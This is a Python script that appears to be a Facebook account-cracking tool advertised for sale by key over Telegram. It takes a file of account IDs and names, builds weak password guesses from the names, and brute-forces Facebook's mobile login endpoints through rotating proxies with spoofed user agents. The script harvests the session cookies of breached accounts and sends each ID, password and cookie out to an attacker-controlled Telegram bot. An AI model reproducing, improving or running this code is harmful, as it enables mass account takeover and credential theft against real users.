import os
import requests
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
#-------------------#
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33'
#-------------------#
os.system('clear')
print(F+'FACE'+Y+'𝙱𝙾𝙾𝙺 '+E+'To'+B+'ol'+Z)
print(E+'$'*40)
print(F+'➨ '+Y+'BY '+E+''+B+'| @R_A_J_Y'+Z)
print(F+'➨ '+Y+'BY '+E+''+B+'| @R_A_J_Y'+Z)
print(G+'$'*40)
print('\n')
token=input(F+'توكن➤ : '+X)
print('\n')
ID=input(Y+'ID>>  ايدي: '+R)
os.system('clear')
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import requests
cookies = {
    'datr': 'iZ2xY04E3jAca46uaLOJLWbL',
    'sb': 'iZ2xYyI7oe2HAXvfOpqjNV2N',
    'locale': 'fa_IR',
    'vpd': 'v1%3B737x393x2.75',
    'wd': '393x737',
    'fr': '03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
}

headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=iZ2xY04E3jAca46uaLOJLWbL; sb=iZ2xYyI7oe2HAXvfOpqjNV2N; locale=fa_IR; vpd=v1%3B737x393x2.75; wd=393x737; fr=03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
}

params = {
    'refid': '8',
}

data = {
    'lsd': 'AVqAhQPrMiI',
    'jazoest': '2963',
    'uid': '100076526146833',
    'flow': 'login_no_pin',
    'next': '',
}

response = requests.post(
    'https://mbasic.facebook.com/login/device-based/validate-pin/',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
import requests,bs4,json,os,sys,random,datetime,time,re
import threading
import urllib3,rich,base64
import threading
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
#DATE AND TIME
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#USER-AGENTS
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96m[Mr.IPYTHONI]')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
#PROXYGEN
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/PSYCHO-PICCHI/ua/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
		
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#COLOR-CODE
BM = '\x1b[1;97m'
P = '\x1b[1;91m'
M = '\x1b[1;97m'
H = '\x1b[1;97m'
K = '\x1b[1;96m'
B = '\x1b[1;93m'
U = '\x1b[1;96m' 
O = '\x1b[1;95m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;97m' # HIJAU +
GREEN = '\033[1;32m' #
hh = '\033[32m' # HIJAU -
u = '\033[96m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;95m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"
#IPYTHONI
def _IPYTHONI_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
#LOGO
def banner():
	print("""%s
	


\033[1;91m
\033[1;91m
\033[1;97m
\033[1;97m  
\033[1;92m   
\033[1;92m 
     OOOOOOOOO
   OO:::::::::OO              
 OO:::::::::::::OO
O:::::::OOO:::::::O
O::::::O   O::::::O
O:::::O     O:::::O
O:::::O     O:::::O
O:::::O     O:::::O
O:::::O     O:::::O
O:::::O     O:::::O
O:::::O     O:::::O
O::::::O   O::::::O
O:::::::OOO:::::::O
 OO:::::::::::::OO
   OO:::::::::OO
     OOOOOOOOO


  SSSSSSSSSSSSSSS
 SS:::::::::::::::S
S:::::SSSSSS::::::S
S:::::S     SSSSSSS
S:::::S
S:::::S
 S::::SSSS
  SS::::::SSSSS
    SSS::::::::SS
       SSSSSS::::S
            S:::::S
            S:::::S
SSSSSSS     S:::::S
S::::::SSSSSS:::::S
S:::::::::::::::SS
 SSSSSSSSSSSSSSS
              AAA
              A:::A
             A:::::A
            A:::::::A
           A:::::::::A
          A:::::A:::::A
         A:::::A A:::::A
        A:::::A   A:::::A
       A:::::A     A:::::A
      A:::::AAAAAAAAA:::::A
     A:::::::::::::::::::::A
    A:::::AAAAAAAAAAAAA:::::A
   A:::::A             A:::::A
  A:::::A               A:::::A
 A:::::A                 A:::::A
AAAAAAA                   AAAAAAA

MMMMMMMM               MMMMMMMM
M:::::::M             M:::::::M
M::::::::M           M::::::::M
M:::::::::M         M:::::::::M
M::::::::::M       M::::::::::M
M:::::::::::M     M:::::::::::M
M:::::::M::::M   M::::M:::::::M
M::::::M M::::M M::::M M::::::M
M::::::M  M::::M::::M  M::::::M
M::::::M   M:::::::M   M::::::M
M::::::M    M:::::M    M::::::M
M::::::M     MMMMM     M::::::M
M::::::M               M::::::M
M::::::M               M::::::M
M::::::M               M::::::M
MMMMMMMM               MMMMMMMM

              AAA
              A:::A
             A:::::A
            A:::::::A
           A:::::::::A
          A:::::A:::::A
         A:::::A A:::::A
        A:::::A   A:::::A
       A:::::A     A:::::A
      A:::::AAAAAAAAA:::::A
     A:::::::::::::::::::::A
    A:::::AAAAAAAAAAAAA:::::A
   A:::::A             A:::::A
  A:::::A               A:::::A
 A:::::A                 A:::::A
AAAAAAA                   AAAAAAA
   
   
 |̲̅̅‌●‌|‌=‌|‌●‌| TERORST |‌●‌|‌=‌|‌●‌|

|‌●‌|‌=‌|‌●‌|   TEAM709KURD 🔥🦅  |‌●‌|‌=‌|‌●‌|

|‌●‌|‌=‌|‌●‌| ɴᴏᴛᴇ 5$ ғᴏʀ ᴋᴇʏ ᴛᴇʟᴇɢʀᴀᴍ @TERORST_709  |‌●‌|‌=‌|‌●‌|

|‌●‌|‌=‌|‌●‌| 웃 TERORST 웃  |‌●‌|‌=‌|‌●‌|      ╰╮✾╭╯✯ ᴛᴏᴏʟ FB✯╰╮✾╭╯

           🇲🇫 TERORST 🇲🇫���
---------------------------------------------  
                                                                   
              
"""%(P))
os.system('clear')
banner()
#MENU
def menu():
	
	_IPYTHONI_(f'\x1b[1;98m[ 1 ] CRACK FILE IDS')
	
	_IPYTHONI_(f'\x1b[1;98m [ 2 ] ID PUBULV [NOT]')
	_____IPYTHONI_____ = input('\x1b[1;96mSELECT :\x1b[1;97m ')
	if _____IPYTHONI_____ in ['1']:
		F()
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m LogOut Successful ')
		exit()
	else:
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m NOT SELECT ')
		back()
def error():
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91mBgarewa Bo Menu')
	time.sleep(2)
	back()
#INPUT-FILE	
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			
			fileX = input ('\x1b[1;93mNAME FILE 🗃️: ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;91mCOLECTED ID : \x1b[1;97m'+str(len(id)))
			Settings()
		except IOError:
			print(" \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()
#SERVER-SETTING			
def Settings():
	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mNEW FB \x1b[1;91m[FASTER]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m2\x1b[1;91m]\x1b[1;97mNEW+OLD\x1b[1;93m [BEST]')
	hu = input('\x1b[1;96mSELECT : \x1b[1;97m')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91mNOT SELECT')
		exit()
	
	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mMOBILE\x1b[1;95m [BESTED]')
	hc = input('\x1b[1;96mSELECT :\x1b[1;97m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('\x1b[1;97m[ M ] MANUAL PASSWORD\x1b[1;96m [HARD]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m[ A ] AUTO PASSWORD\x1b[1;92m [EASY]\n\x1b[1;96mSELECT : \x1b[1;97m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input(' \x1b[1;91m\x1b[1;96m\x1b[1;97m Add Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
def passwrd():
	print(f"\x1b[1;97m------------------------------------------------------------")
	print(f"\x1b[1;97m[+] DATE : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta} ")
	print(f"\x1b[1;97m------------------------------------------------------------")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
 					pwv.append(nmf)
 					pwv.append('123456$$')
 					pwv.append('123@@@@')
 					pwv.append('mmnnbbvvccxx')
 					pwv.append('mmnnbbvvccxxzz')
 					pwv.append('1234512345')
 					pwv.append('1234512345@')
 					pwv.append('1234512345@@')
 					pwv.append('qwweerrttyyuuiioopp')
 					pwv.append('qwertyuiop')
 					pwv.append('5544332211')
 					pwv.append('12345qwert')
 					pwv.append('1234@@@@')
 					pwv.append('20232023')
 					pwv.append('00998877')
 					pwv.append('10002000')
 					pwv.append('12341234@@')
 					pwv.append('11223344@@')
 					pwv.append('0099887766')
 					pwv.append(frs+'#?@#')
 					pwv.append(frs+'@@')
 					pwv.append(frs+'@@@')
 					pwv.append('ppooiiuu')
 					pwv.append(frs+'1122')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'@123')
 					pwv.append(frs+'@#$')
 					pwv.append(frs+'123@@')
 					pwv.append('mmnnbbvv')
 					pwv.append('20002000')
 					pwv.append('qqqqwwwwtt')
 					pwv.append('qqwweerrttyy')
 					pwv.append('ppooiiuuyy')
 					pwv.append('qwerty123456')
 					pwv.append(frs+'1122')
 					pwv.append(frs+'112233')
 					pwv.append(frs+'0987')
 					pwv.append(frs+'09876')
 					pwv.append(frs+'098765')
 					pwv.append(frs+'123123')
 					pwv.append('qqwweerrtt')
 					pwv.append('qwertyuiopasdfghjkl')
 					pwv.append('qwertyuiopasdfghjklzxcvbnm')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
 					pwv.append(nmf)
 					pwv.append('aaaasssss')
 					pwv.append('100200300')
 					pwv.append('qwertqwer')
 					pwv.append('zxcvzxcv')
 					pwv.append('zzxxccvv')
 					pwv.append('qqwweerr')
 					pwv.append('zzzzxxxxx')
 					pwv.append('ppppoooo')
 					pwv.append('oooopppp')
 					pwv.append('qqqqwwww')
 					pwv.append('wwwwqqqq')
 					pwv.append('mmmmnnnn')
 					pwv.append('aaaassss')
 					pwv.append('07700770')
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456789')
 					pwv.append('12345'+frs)
 					pwv.append('123'+frs)
 					pwv.append(frs+'2002')
 					pwv.append('frs+frs+')
 					pwv.append(frs+'2004')
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m CRACK COMPLETE ')
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m OK : {h}%s '%(ok))
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m  RETURN CRACK \x1b[1;97m[Y]\n \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91mEXIT [T]')
	woi = input('\x1b[1;97m SELECT  : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t \x1b[1;91m\x1b[1;96m\x1b[1;97m BYE {u} ')
		time.sleep(2)
		exit()

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([P,h,Z,N,O,U])
	sys.stdout.write(f"\r (TEROR) {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				statuscp = f'''𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞❌
𖢐‡𖢐‡𖢐𖢐‡𖢐‡𖢐‡𖢐‡𖢐‡𖢐‡𖢐‡𖢐‡𖢐‡𖢐‡𖢐

->> ID : -- : {idf}\n

->> PASS: -- : {pw}\n
⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
𓏴𓏵𓏴𓏵𓏴𓏴𓏵𓏴𓏵𓏴𓏵𓏴𓏵𓏴𓏵𓏴𓏵𓏴
					
					'''
				statuscp1 = nel(statuscp, style='red')
				cetak(nel(statuscp1, title='SESI'))
				open('CP/'+cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))     
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				statusok = f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊ᥬ🤢᭄OK
༺★࿕★࿕★✟★𖣐★✞★♱★✞★𖣐★✟★࿕★࿕★༻

->> ID :--     {idf}\n
->> PASS: --    {pw}\n
⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
༽⦓✪⦔⦓❊⦔⦓✪⦔⦓❊⦔⦓✪⦔⦓❊⦔⦓✪⦔⦓❊⦔⦓✪⦔༼
➺ᖇᗩᒍY					
					'''
				statusok1 = nel(statusok, style='green')
				cetak(nel(statusok1, title='OK'))
				requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
				cek_RAJY(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot Check Options (Check Login In Lite/Basic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
def cek_opsi():
	c = len(akun)
	hu = '#'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] INPUT')
	cek = '# PROSESES CO'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ERROR=-     %s'%(b,kes,x))
				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> ERROR       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '#INTERNET NO CONNECTED'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
def cek_RAJY(kuki):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
    except AttributeError:
        print ("\r    %s\033[0m cookie invalid"%(M))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
    except AttributeError:
        print ("\r    %s \033[0mcookie invalid"%(M))


if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
